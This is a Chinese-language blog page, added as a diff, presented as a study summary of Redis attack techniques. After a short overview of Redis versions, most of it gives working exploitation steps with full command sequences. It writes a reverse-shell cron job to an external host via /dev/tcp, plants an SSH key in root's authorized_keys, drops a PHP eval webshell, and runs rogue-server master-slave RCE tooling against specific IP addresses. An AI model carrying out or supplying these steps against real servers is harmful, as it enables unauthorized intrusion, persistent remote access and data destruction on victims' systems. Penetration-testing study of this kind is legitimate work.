@@ -1,0 +1,1144 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chongqing.jpg">
+  <link rel="icon" href="/img/chongqing.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="sangnigege">
+  <meta name="keywords" content="一个做事不将就的人，阻止他的只有时间">
+  
+    <meta name="description" content="Redis介绍什么是redisRedis 是 C 语言开发一个开源高性能的 key-value 键值对存储类型的内存NoSQL数据库，且支持持久化到硬盘，广泛应用在数据集群，分布式队列，信息中间件等网络架构中。在实际渗透场景中，Redis 常常用来缓存 Session、网站页面架构、短信验证码等数据。 版本区别冷知识： 严格来说主从同步在 2.8 之前就有了，2.8 之前触发全量复制的命令是 sy">
+<meta property="og:type" content="article">
+<meta property="og:title" content="64Redis攻击利用总结">
+<meta property="og:url" content="http://example.com/2026/test64/index.html">
+<meta property="og:site_name" content="重庆森林不在重庆">
+<meta property="og:description" content="Redis介绍什么是redisRedis 是 C 语言开发一个开源高性能的 key-value 键值对存储类型的内存NoSQL数据库，且支持持久化到硬盘，广泛应用在数据集群，分布式队列，信息中间件等网络架构中。在实际渗透场景中，Redis 常常用来缓存 Session、网站页面架构、短信验证码等数据。 版本区别冷知识： 严格来说主从同步在 2.8 之前就有了，2.8 之前触发全量复制的命令是 sy">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220999.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220178.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220506.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220783.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220972.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220187.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220778.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220694.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220689.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220110.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220935.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220124.jpeg">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220255.jpeg">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220795.jpeg">
+<meta property="article:published_time" content="2026-04-15T10:15:22.863Z">
+<meta property="article:modified_time" content="2026-04-15T14:39:58.266Z">
+<meta property="article:author" content="sangnigege">
+<meta property="article:tag" content="学习总结">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220999.png">
+  
+  
+  
+  <title>64Redis攻击利用总结 - 重庆森林不在重庆</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","app_key":"rSHs3EnI9lT7nQwv5J7fcBnq","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>重庆森林不在重庆</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="64Redis攻击利用总结"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-15 18:15" pubdate>
+          2026年4月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          63 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">64Redis攻击利用总结</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Redis介绍"><a href="#Redis介绍" class="headerlink" title="Redis介绍"></a>Redis介绍</h1><h2 id="什么是redis"><a href="#什么是redis" class="headerlink" title="什么是redis"></a>什么是redis</h2><p>Redis 是 C 语言开发一个开源高性能的 key-value 键值对存储类型的内存NoSQL数据库，且支持持久化到硬盘，广泛应用在数据集群，分布式队列，信息中间件等网络架构中。在实际渗透场景中，Redis 常常用来缓存 Session、网站页面架构、短信验证码等数据。</p>
+<h2 id="版本区别"><a href="#版本区别" class="headerlink" title="版本区别"></a>版本区别</h2><p><strong>冷知识：</strong></p>
+<p>严格来说主从同步在 2.8 之前就有了，2.8 之前触发全量复制的命令是 sync 和 psync，但是使用 sync 只能执行全量同步，2.8 之后的命令同时支持全量同步和部分同步。总而言之，2.8 之前的主从同步是有缺陷的，而且如今也几乎不可能碰到低于 3.x 版本的 redis 了，怼着这点深究没意义。</p>
+<p>所以，主从复制并不是只有 4.x - 5.x 才有的，只是 4.x 开始才新增了自定义 so 文件模块的功能，结合主从复制把 so 文件丢过去就能 RCE。</p>
+<p>而 6.x 也依然支持主从复制功能，只是官方新增了对 so 文件的权限校验，所以你丢个 so 文件过去也没法 RCE。具体见<a target="_blank" rel="noopener" href="https://github.com/redis/redis/pull/6257">commit</a></p>
+<ul>
+<li><p><strong>Redis &gt;&#x3D; 2.8</strong></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">默认无密码。<br>新增主从同步功能，换言之，从这个版本开始攻击者可以利用主从复制实现无损文件上传。<br>无损文件上传为 Windows 的 Redis 利用拉开了很好的口子，因为可以无损上传 DLL、EXE、VBS、LNK 等完成劫持和写入启动项。<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Redis &lt;&#x3D; 3.2.0</strong></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">默认无密码，监听 <span class="hljs-number">0.0.0.0</span>，裸奔<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Redis &gt; 3.2.0</strong></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">新增保护模式（protected-<span class="hljs-keyword">mode</span>），该模式默认开启，该模式不允许远程连接。<br>默认还是无密码，但是默认监听本地 <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>，不对外开放，除非自己配置为 <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>，且把 protected-<span class="hljs-keyword">mode</span> 改为 <span class="hljs-keyword">no</span>。<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Redis 4.x - 5.x</strong></p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">默认还是无密码，且监听 <span class="hljs-number">127.0.0.1</span>，新增自定义模块加载特性，结合主从复制上传so文件可利用这个可直接 RCE<br></code></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Redis 6.x</strong></p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs smali">新增了针对Redis模块和so文件的执行权限校验，所以主从复制上传的so文件无法被执行了（https://github.com/redis/redis/pull/6257），但是主从复制传输无损文件依然可用，config写文件也依然可用。<br><br>Github Commit 标题：Modules must have<span class="hljs-built_in"> execute </span>permissions to load<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="redis命令行"><a href="#redis命令行" class="headerlink" title="redis命令行"></a>redis命令行</h2><p>命令行连接</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># redis-cli -h [RedisIP] </span><br><span class="hljs-attribute">redis</span>-cli -h  <span class="hljs-number">39.98.114.183</span>  <br></code></pre></td></tr></table></figure>
+
+<p>信息探测</p>
+<p>一般关注以下信息：redis 版本、进程id、系统版本、系统架构</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">01</span>:<span class="hljs-number">6379</span>&gt; info<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>Linux上Redis RCE的路子主要有两种：</p>
+<p>一种是直接写入文件，可以是ssh公钥、webshell也可以是计划任务；</p>
+<p>另一种是Redis4.x、5.x上的主从getshell，这比写东西来的更直接方便。</p>
+<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p><strong>利用条件</strong></p>
+<ul>
+<li><p>redis 服务使用 root 账号启动</p>
+</li>
+<li><p>CentOS机器（在 debian、ubuntu 等环境中由于这些环境对计划任务的格式解析非常严格，所以没办法执行成功）</p>
+<p>这个方法只能Centos上使用，Ubuntu上行不通，原因如下：</p>
+<p>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错(root) INSECURE MODE (mode 0600 expected)，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</p>
+<p>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</p>
+<p>由于系统的不同，crontrab定时文件位置也会不同：</p>
+<p>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code></p>
+<p>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;﻿</code></p>
+</li>
+</ul>
+<p><strong>计划任务格式</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name command to be executed</span><br></code></pre></td></tr></table></figure>
+
+<p>例如，下面这个是每1分钟反弹1次shell：</p>
+<figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tp">*/<span class="hljs-number">1</span> * * * * bash -i &gt;&amp; dev/tcp/<span class="hljs-keyword">X</span>.<span class="hljs-keyword">X</span>.<span class="hljs-keyword">X</span>.<span class="hljs-keyword">X</span>/<span class="hljs-number">7789</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>计划任务写入位置</strong></p>
+<ul>
+<li><strong>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</strong>（文件，且文件名得问用户名）</li>
+<li><strong>&#x2F;etc&#x2F;crontab</strong>（文件，计划任务中得指明用户名，且程序都要用绝对路径，该文件只有root可写）</li>
+</ul>
+<p><strong>利用过程</strong></p>
+<p>就正常写计划任务就行，只是要在前后加上<code>\n\n</code>：</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs swift"># <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>root<br>flushall<br><span class="hljs-keyword">set</span> <span class="hljs-number">1</span> <span class="hljs-string">&quot;<span class="hljs-subst">\n</span>*/1 * * * * bin/bash -i &gt;&amp; dev/tcp/127.0.0.1/7789 0&gt;&amp;1<span class="hljs-subst">\n</span>&quot;</span><br>config <span class="hljs-keyword">set</span> dir <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span><br>config <span class="hljs-keyword">set</span> dbfilename root<br>save<br><br># <span class="hljs-regexp">/etc/</span>crontab，区别在于，这个计划任务中需要指明由哪个用户执行，例如：<br><span class="hljs-operator">*/</span><span class="hljs-number">1</span> <span class="hljs-operator">*</span> <span class="hljs-operator">*</span> <span class="hljs-operator">*</span> <span class="hljs-operator">*</span> root bin<span class="hljs-regexp">/bash -i &gt;&amp; /</span>dev<span class="hljs-regexp">/tcp/</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-operator">/</span><span class="hljs-number">7789</span> <span class="hljs-number">0</span><span class="hljs-operator">&gt;&amp;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>**注意：**网上的 redis getshell 计划任务语句大都有问题，只有<code>/var/spool/cron/root</code>这条可以，核心就是要在语句的左右两边都加1个 \n 。</p>
+<p>经笔者测试，<code>/etc/crontab</code>这个文件在带入 redis 脏数据后即使成功换行了也无法成功得到执行，具体原因不详，如果有朋友解决了这个可以在评论区补充。目前只能通过主从复制带入无损文件 crontab 进行利用。</p>
+<p><strong>注意：</strong>&#x2F;etc&#x2F;crontab 中的环境变量是与系统独立的，也就是说，任何程序都要写绝对路径才能成功，例如 bash 必须得写成 bin&#x2F;bash，不然无法成功反弹 shell</p>
+<ul>
+<li><strong>&#x2F;etc&#x2F;cron.hourly、&#x2F;etc&#x2F;cron.weekly、&#x2F;etc&#x2F;cron.mouthly、&#x2F;etc&#x2F;cron.daily</strong>（文件夹，且只有 root 可在里面写文件）</li>
+</ul>
+<p>顾名思义，放在里面的 sh 脚本文件会被按照对应的时间（时、周、月、日）呈规律被执行，但是，脚本需要具备可执行权限（x）才可被执行，而我们通过 redis 主从同步复制进去的文件默认权限为 rw-r–r– ，所以几个计划任务路径无法通过 redis 完成利用。</p>
+<p>如果是自己复现，可以使用下面的语句查看计划任务执行状态：</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">tail -f vim /<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/cron<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="ssh公钥"><a href="#ssh公钥" class="headerlink" title="ssh公钥"></a>ssh公钥</h3><p><strong>利用条件</strong></p>
+<ul>
+<li>redis 服务使用 root 账号启动</li>
+<li>服务器开放了SSH服务，而且允许使用密钥登录（服务器默认关闭 key 登录选项）</li>
+</ul>
+<p>**注意：**经实战测试，阿里云机器（CentOS）的这个选项虽然是被注释掉的，但是其实只要你写key，就能直接通过 key 去连接，原因不详，测试时发现 authorized_keys 中已经有一个 key，是阿里云的，可能这是官方的需求吧。从其它笔者的文章能看出，云主机基本都是默认就可以通过key去连接。所以，只要不是管理员故意设置为 no，那么都是可以的。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">默认在/etc/ssh/sshd_config中不开启</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">PubkeyAuthentication <span class="hljs-built_in">yes</span></span><br></code></pre></td></tr></table></figure>
+
+<p><strong>利用过程</strong></p>
+<p>（1）生成一对 ssh 公私钥</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title"># 指定在当前目录生成2个文件，私钥:rsa_key 公钥:</span>rs<span class="hljs-built_in">a_key</span>.pub<br>ssh-keygen -t rsa -f ./rs<span class="hljs-built_in">a_key</span><br>ssh-keygen -t rsa -f ./rs<span class="hljs-built_in">a_key</span><br><br><br></code></pre></td></tr></table></figure>
+
+<p>（2）因为即使 flushall 了也还是有脏数据，但是幸好 Linux 对 authorized_keys 的解析是比较模糊的，通过换行不让脏数据和公钥数据挤在一行即可，所以为了保证写入的 authorized_key 能被解析，必须引入换行符 \n\n</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs swift">flushall<br><span class="hljs-keyword">set</span> xxx <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5j6OSioyj1AdNH2wSs9vC0ta+1ZZjHwFOZeI974xAMt7awC50covqX/s34pl3+PUewENS6vHrGp40csmUmb0Hd1390df5KUMkI4DxN2TicPeg9+DdjwY7j0V5T/5VfBrTYmItj+MstUyNoYzxKac+Npx5OtsoRqFYwPcXLB/EL5Fl+LZUFP3HzLsS7KkVSCtcxbv6Lx4BqnPPBednIJIjuJ1Wlh8BkEYUnqSOPzOZCJJ0kvMe4RmJrSafcf9q+Ifx2pUkw0ZxYwPjt8yvISZKvPlxOd8TY2Joa6lnmKEhTd/t94SzBCAoHi3zmOcKEaRV7foyvUFvTDZvmPpvVTRZYW8PEbFc/LxwJvIKnypm4t5aqSDhWetR+lud9Qc1jpktAOx9UIA1jlvEwmN08iyE61o4TPv/RLVvTRfE/3DN2kNAKIdU47QEqKL0TKQ85BrSFk5Jjry/EfRwjtn1ZUS4mk0fWZVOopy2WcqUUlEaMoQfTQmOJqR3pqLiLSwi37s= root@kali<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>（3）写入 key 文件</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">config <span class="hljs-built_in">set</span> dir /root/.ssh/<span class="hljs-built_in"></span><br><span class="hljs-built_in">config </span><span class="hljs-built_in">set</span> dbfilename authorized_keys<br>save<br></code></pre></td></tr></table></figure>
+
+<p>（4）连接</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ssh -<span class="hljs-selector-tag">i</span> ./rsa_key root<span class="hljs-keyword">@39</span>.99.140.174<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="写-webshell"><a href="#写-webshell" class="headerlink" title="写 webshell"></a>写 webshell</h3><p><strong>利用条件</strong></p>
+<ul>
+<li>redis 服务使用 root 账号启动</li>
+<li>已知 web 绝对路径</li>
+</ul>
+<p><strong>利用过程</strong></p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">flushall</span><br><span class="language-xml">config set dir /var/www/html/</span><br><span class="language-xml">config set dbfilename redis.php</span><br><span class="language-xml">set shell &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;x&quot;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;</span><br><span class="language-xml">save</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="主从复制配合动态库加载"><a href="#主从复制配合动态库加载" class="headerlink" title="主从复制配合动态库加载"></a>主从复制配合动态库加载</h3><p><strong>利用条件</strong></p>
+<ul>
+<li>redis 4.x或者redis 5.x</li>
+</ul>
+<p><strong>利用原理</strong></p>
+<p>主从模式指使用一个 redis 作为主机，其他的作为备份机，主机从机数据都是一样的，从机只负责读，主机只负责写，该功能从 redis 2.8+ 开始有。</p>
+<p>在 reids  4.x 之后，通过外部拓展，可以通过构造 so 文件在 redis 中实现一个新的 redis 命令。在两个 redis 实例设置主从模式的时候，redis 的主机实例可以通过 FULLRESYNC 同步文件到从机上，然后在从机上加载恶意so文件，即可执行命令。</p>
+<p>先利用主从复制把 so 文件远程复制过去，然后再通过 MODULE LOAD 来加载 so 文件即可 RCE，其过程如下：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">第一步，我们伪装成redis数据库，然后受害者将我们的数据库设置为主节点（或者自己开个redis服务，通过config文件把dbfilename设置为<span class="hljs-built_in">exp</span>文件的名字就行）<br>第二步，我们设置备份文件名为<span class="hljs-keyword">so</span>文件<br>第三步，设置传输方式为全量传输<br>第四步，加载恶意<span class="hljs-keyword">so</span>文件，实现任意命令执行<br></code></pre></td></tr></table></figure>
+
+<p>**注意：**由于采用的是全量传输备份，所以该利用方式会将对方所有数据库清空覆盖，很容易打草惊蛇，而且对业务可能会造成不可挽回的影响</p>
+<p><strong>利用过程</strong></p>
+<p>这里提供几种工具</p>
+<p>第一种：<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">n0b0dyCN&#x2F;redis-rogue-server: Redis(&lt;&#x3D;5.0.5) RCE</a></p>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-comment"># 目标redis服务端口默认为6379，vps监控的端口默认为21000</span><br><span class="hljs-string">python3</span> <span class="hljs-string">redis-rogue-server</span>.<span class="hljs-string">py</span> <span class="hljs-built_in">--rhost</span> <span class="hljs-string">39</span>.<span class="hljs-string">99</span>.<span class="hljs-string">134</span>.<span class="hljs-string">226</span> <span class="hljs-built_in">--lhost</span> 公网<span class="hljs-string">IP</span><br><span class="hljs-comment"># 可以自己选择交互式shell或者反弹shell</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220999.png" srcset="/img/loading.gif" lazyload alt="image-20250806205702381"></p>
+<p>第二种：<a target="_blank" rel="noopener" href="https://github.com/Dliv3/redis-rogue-server">Dliv3&#x2F;redis-rogue-server: Redis 4.x&#x2F;5.x RCE</a></p>
+<p>本项目为<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN">n0b0dyCN</a>同名项目的fork, 在原项目代码基础之上修复了一些bug, 添加了一些新功能, 并针对不同漏洞利用场景做了一些优化。</p>
